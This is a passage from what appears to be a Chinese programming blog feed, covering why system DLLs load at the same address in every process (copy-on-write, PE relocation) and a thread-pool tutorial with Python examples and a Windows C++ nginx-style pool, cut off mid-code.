注入依然能实现是因为DLL文件在不同进程中加载的基址虽然经过了随机化的处理，但系统DLL文件(如system32目录下的DLL)在各个进程中通常加载地址仍然是相同的，以保证不同进程能互相调用这些系统DLL提供的 API。</p><h2 id="2-2-Copy-On-Write"><a href="#2-2-Copy-On-Write" class="headerlink" title="2.2. Copy-On-Write"></a>2.2. Copy-On-Write</h2><p>其中更深层次的原因是操作系统需要支持写时复制机制（copy-on-write）。写时复制是现代操作系统的一个重要特性。操作系统使用页表（Page Table）来将进程的虚拟地址映射到物理地址。页表是一种数据结构，它存储了虚拟地址和物理地址之间的映射关系。</p><p>A 进程和 B 进程共享同一个 DLL 时，它们的虚拟地址空间中的虚拟地址会指向相同的物理内存页。这意味着它们共享同一份物理内存。当 A 进程尝试对 DLL 内存页进行写操作时，操作系统会触发写时复制，操作系统会将共享的物理内存页复制一份，创建一个新的物理页供 A 进程使用。A 进程会拥有自己的独立副本，而进程B仍然使用原始的物理内存页。</p><p>Copy-On-Write机制触发并不会影响虚拟地址空间的映射关系。因此，在Copy-On-Write机制中，虚拟地址空间中DLL的加载基址不会发生变化。进程A仍然可以通过原始的加载基址访问和调用DLL中的代码和数据。当多个进程加载同一个 DLL 文件并且它们的加载基址保持相同时，可以更好地利用 Copy-On-Write 机制。这样可以实现代码和只读数据的共享，延迟数据的复制，并提高内存利用率和性能。如果 DLL 加载地址不一致，Copy-On-Write 无法共享内存页，每个进程都需要单独复制 DLL 的只读内存，失去了内存优化的效果。</p><h2 id="2-3-PE文件的加载机制"><a href="#2-3-PE文件的加载机制" class="headerlink" title="2.3. PE文件的加载机制"></a>2.3. PE文件的加载机制</h2><p>在 PE 文件中有一个加载基址（Image Base）的字段，它指定了 DLL 文件在内存中的起始地址。操作系统在加载DLL文件时，首先会检查文件头中的标志，确定是否启用了ASLR或者是否存在重定位表。如果存在重定位表，操作系统会遍历重定位表中的每个条目。重定位表中的每个条目包含了两个关键信息：</p><ul><li>重定位类型（Relocation Type）： 指定了需要进行的重定位操作，例如相对地址的基址绝对化。</li><li>偏移量（Offset）： 指定了在文件中的位置，即需要进行重定位的虚拟地址相对于模块基址的偏移量。</li></ul><p>操作系统使用以下公式计算PE 文件中需要进行重定位的虚拟地址：VirtualAddress &#x3D; ImageBase + Offset（偏移量）</p><p>在相同的操作系统和相同的加载条件下，相同的DLL文件在不同进程中的重定位计算是一致的。因此，无论 ASLR 是否启用，PE 文件的加载机制决定了 DLL 文件在各个进程中的加载基址是相同的。</p><p>综合这三个角度，虽然ASLR在操作系统的进程管理中引入了加载基址的随机化，但由于Copy-On-Write和PE文件加载机制的作用，同一DLL文件在不同进程中的加载基址仍然是相同的。这有助于确保不同进程中的DLL文件内部结构保持一致，同时确保进程间的数据隔离，提高系统的整体安全性和资源使用效率。</p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线程池</title>
      <link href="/2024/02/04/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2024/02/04/%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>处理大量的数据</p><p>线程池是可用于执行任务的线程的集合。这是一种管理和重用线程的方法，可以减少创建和销毁线程的开销。</p><p>在线程池中，会创建和维护固定数量的线程。当任务提交到线程池时，将分配一个可用线程来执行该任务。一旦任务完成，线程就会返回到池中，并可用于执行另一个任务。</p><p>线程池通常用于需要同时执行多个任务的应用程序。它们可以通过减少创建和销毁线程的开销，以及允许并行执行任务来提高性能。ThreadPoolExecutor类用于创建和管理线程池，submit方法用于将任务提交到池中执行。以下是如何使用ThreadPoolExecutor类创建线程池的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a thread pool with 4 threads</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">4</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    <span class="comment"># Submit a task to the pool</span></span><br><span class="line">    future = executor.submit(my_function, arg1, arg2)</span><br><span class="line">    <span class="comment"># Wait for the task to complete and get the result</span></span><br><span class="line">    result = future.result()</span><br></pre></td></tr></table></figure><p>在本例中，使用ThreadPoolExecutor类创建了一个包含4个线程的线程池。使用submit方法将任务提交到池中，使用result方法等待任务完成并获得结果。</p><p>读写锁是一种同步机制，用于控制对共享资源的访问。读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。</p><p>条件变量是一种同步机制，用于在多个线程之间传递信号。条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类包含wait，notify和notifyall等方法，用于等待条件变为真，通知等待线程条件已经满足，以及通知所有等待线程条件已经满足。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。</p><p>状态变量是用于跟踪线程池中任务的状态的变量。在ThreadPoolExecutor类中，有几个状态变量用于跟踪线程池中任务的状态，例如active<em>count，completed</em>count和shutdown等。active<em>count变量用于跟踪当前正在执行的任务数，completed</em>count变量用于跟踪已完成的任务数，shutdown变量用于指示线程池是否已关闭。这些状态变量可以帮助你了解线程池中任务的状态，并根据需要采取适当的措施。</p><p>读写锁和条件变量是两种不同的同步机制，用于不同的目的。读写锁用于控制对共享资源的访问，以提高并发性能。条件变量用于在多个线程之间传递信号，以控制线程的执行顺序。</p><p>读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。</p><p>条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。</p><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><p>互斥体（Mutex）是一种同步机制，用于保护共享资源免受并发访问的影响。在线程池中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。因此，在线程池中使用互斥体是非常重要的。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享变量</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个互斥体</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Worker <span class="subst">&#123;num&#125;</span> starting&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取互斥体</span></span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        <span class="comment"># 修改共享变量</span></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Worker <span class="subst">&#123;num&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建一个包含4个线程的线程池</span></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">4</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="comment"># 向线程池中添加10个任务</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            executor.submit(worker, i)</span><br><span class="line">    <span class="comment"># 打印共享变量的值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Counter value: <span class="subst">&#123;counter&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>为了避免多个线程同时修改counter，我们使用了一个互斥体lock来保护它。在worker函数中，我们首先获取互斥体，然后修改共享变量counter。这样，我们就可以确保在任何给定时间只有一个线程可以访问counter，从而避免数据竞争和其他并发问题。</p><p>在计算机科学中，互斥体（Mutex）和锁（Lock）是两个常用的概念，它们都是用于保护共享资源免受并发访问的影响。在实际应用中，这两个概念有时会被混淆使用，但它们并不完全相同。</p><p>互斥体是一种同步机制，用于保护共享资源免受并发访问的影响。在多线程编程中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。在Python中，可以使用threading模块中的Lock类来实现互斥体的功能。</p><p>锁是一种更加通用的同步机制，它可以用于实现互斥体、信号量、条件变量等多种同步原语。在Python中，可以使用threading模块中的Lock类来实现锁的功能。Lock类提供了acquire和release方法，用于获取和释放锁。当一个线程获取了锁之后，其他线程就无法获取锁，直到该线程释放锁为止。因此，锁可以用来保护临界区，以确保在任何给定时间只有一个线程可以访问它们。</p><p>在实际应用中，互斥体和锁有时会被混淆使用，因为它们的功能有一定的重叠。在某些情况下，互斥体和锁可以互换使用，但在其他情况下，它们可能会有所不同。例如，在某些操作系统中，互斥体和锁的实现方式可能不同，因此它们的性能和行为也可能会有所不同。</p><p>在Python中，Lock类通常被用作互斥体的实现方式。因此，在线程池中使用Lock类来保护共享资源是非常常见的做法。</p><h2 id="假唤醒"><a href="#假唤醒" class="headerlink" title="假唤醒"></a>假唤醒</h2><p>虚假唤醒（Spurious Wakeup）是指在多线程编程中，一个线程在等待某个条件变量时，即使没有其他线程通知它，它也会被唤醒。这种情况可能会导致程序出现错误或异常行为，因为线程可能会在没有满足条件的情况下被唤醒。一般是由于在设置超时的时候发生。</p><p>在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类提供了wait、notify和notify_all等方法，用于等待条件变量、通知等待线程和通知所有等待线程。在使用Condition类时，需要注意虚假唤醒的问题。为了避免虚假唤醒，可以在wait方法中使用循环来检查条件是否满足，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享变量</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个条件变量</span></span><br><span class="line">cond = threading.Condition()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>():</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Worker starting&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取条件变量</span></span><br><span class="line">    <span class="keyword">with</span> cond:</span><br><span class="line">        <span class="comment"># 检查条件是否满足</span></span><br><span class="line">        <span class="keyword">while</span> counter &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="comment"># 等待条件变量</span></span><br><span class="line">            cond.wait()</span><br><span class="line">        <span class="comment"># 修改共享变量</span></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Worker finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建一个线程</span></span><br><span class="line">    t = threading.Thread(target=worker)</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="comment"># 修改共享变量</span></span><br><span class="line">    <span class="keyword">with</span> cond:</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 通知等待线程</span></span><br><span class="line">        cond.notify()</span><br></pre></td></tr></table></figure><p>在这个示例中，我们首先定义了一个共享变量counter，它将被多个线程同时访问和修改。然后，我们创建了一个条件变量cond，它将用于等待和通知线程。在worker函数中，我们首先获取条件变量，然后使用循环来检查条件是否满足。如果条件不满足，线程将等待条件变量。在主线程中，我们修改了共享变量counter，然后通知等待线程。在worker函数中，线程被唤醒后，会再次检查条件是否满足，如果条件满足，就会修改共享变量counter。这样，我们就可以避免虚假唤醒的问题，确保线程只有在满足条件的情况下才会被唤醒。</p><p>总之，虚假唤醒是多线程编程中常见的问题，需要特别注意。在Python中，可以使用threading模块中的Condition类来实现条件变量，并使用循环来避免虚假唤醒的问题。 </p><p>在c++中，如果要解决，需要在传入timeout的同时传入一个函数指针，当二者同时满足的时候才能继续向下执行。</p><h2 id="nginx线程池"><a href="#nginx线程池" class="headerlink" title="nginx线程池"></a>nginx线程池</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ngx_thread_pool_queue_init(q)                                         \</span></span><br><span class="line"><span class="meta">    (q)-&gt;first = NULL;                                                        \</span></span><br><span class="line"><span class="meta">    (q)-&gt;last = &amp;(q)-&gt;first</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//任务节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ngx_thread_task_t</span> &#123;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>* next; <span class="comment">//使用列表保存任务节点</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>       id;   <span class="comment">//对该任务的一个标识</span></span><br><span class="line"><span class="type">void</span>* ctx;               <span class="comment">//用户数据私有数据</span></span><br><span class="line"><span class="built_in">void</span>               (*handler)(<span class="type">void</span>* ctx); <span class="comment">//处理私用数据的函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>* first;</span><br><span class="line"><span class="type">ngx_thread_task_t</span>** last;</span><br><span class="line">&#125; <span class="type">ngx_thread_pool_queue_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//线程池的管理员</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ngx_thread_pool_t</span> &#123;</span><br><span class="line"></span><br><span class="line">SRWLOCK       lock;         <span class="comment">//读写锁 条件变量</span></span><br><span class="line"><span class="type">ngx_thread_pool_queue_t</span>   queue;          <span class="comment">//存放任务节点的队列  内存池</span></span><br><span class="line"><span class="type">int</span>                 waiting;</span><br><span class="line">CONDITION_VARIABLE          cond;         <span class="comment">//条件变量</span></span><br><span class="line"><span class="type">int</span>                threads;      <span class="comment">//池中的配置的线程最大个数</span></span><br><span class="line"><span class="type">int</span>                 max_queue;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ngx_thread_pool_t</span>*</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_config</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> threads)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_task_post</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp, <span class="type">ngx_thread_task_t</span>* task)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;浅谈nginx线程池.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//条件变量</span></span><br><span class="line"><span class="comment">//读写锁</span></span><br><span class="line"><span class="type">static</span> <span class="type">ngx_thread_pool_t</span> g_tp;    <span class="comment">//定义了一个全局静态的线程池管理员结构体</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span>               ngx_thread_pool_task_id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> DWORD WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_cycle</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_destroy</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span>;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_exit_handler</span><span class="params">(<span class="type">void</span>* ctx)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ngx_thread_pool_t</span>*</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_config</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> threads)</span> <span class="comment">//设置的线程个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_queue = <span class="number">65536</span>;  <span class="comment">//任务队列</span></span><br><span class="line"><span class="keyword">if</span> (threads &lt; <span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">threads = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ngx_thread_pool_t</span>* tp = &amp;g_tp;   <span class="comment">//全局静态结构体</span></span><br><span class="line"><span class="keyword">if</span> (tp-&gt;threads)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line">&#125;</span><br><span class="line">tp-&gt;threads = threads;    <span class="comment">//设置线程池中的线程个数</span></span><br><span class="line">tp-&gt;max_queue = max_queue;</span><br><span class="line"><span class="keyword">return</span> tp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init_worker</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//日志信息记录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ngx_thread_pool_init</span>(tp) != <span class="literal">true</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_init</span><span class="params">(<span class="type">ngx_thread_pool_t</span>* tp)</span>  <span class="comment">//网络 文件读写  组件与组件IO操作</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span>             err;</span><br><span class="line">DWORD       tid;</span><br><span class="line">SECURITY_ATTRIBUTES  SecurityAttributes = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">bool</span>  IsOk = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ngx_thread_pool_queue_init</span>(&amp;(tp-&gt;queue));   <span class="comment">//初始化队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建读写锁</span></span><br><span class="line"><span class="built_in">InitializeSRWLock</span>(&amp;(tp-&gt;lock));<span class="comment">//初始化读写锁    线程同步</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建条件变量</span></span><br><span class="line"><span class="built_in">InitializeConditionVariable</span>(&amp;(tp-&gt;cond));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以在这里进行线程池中的线程属性设置 </span></span><br><span class="line"><span class="comment">//IsOk = pthread_attr_init(&amp;attr);    </span></span><br><span class="line"><span class="keyword">if</span> (IsOk == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为线程池创建线程</span></span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; tp-&gt;threads; n++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//线程栈的默认大小是1M</span></span><br><span class="line">HANDLE ThreadHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)ngx_thread_pool_cycle, tp,<span class="number">0</span>,&amp;tid);</span><br><span class="line"><span class="keyword">if</span> (ThreadHandle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//线程回收  </span></span><br><span class="line"><span class="comment">//工作队列任务节点进行销毁</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//(void)pthread_attr_destroy(&amp;attr);   //销毁之前为线程设置属性时产生的动态内存</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> DWORD WINAPI</span></span><br><span class="line"><span class="function"><span class="title">ngx_thread_pool_cycle</span><span class="params">(LPVOID ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">ngx_thread_pool_t</span>* tp = (<span class="type">ngx_thread_pool_t</span>*)ctx;  <span 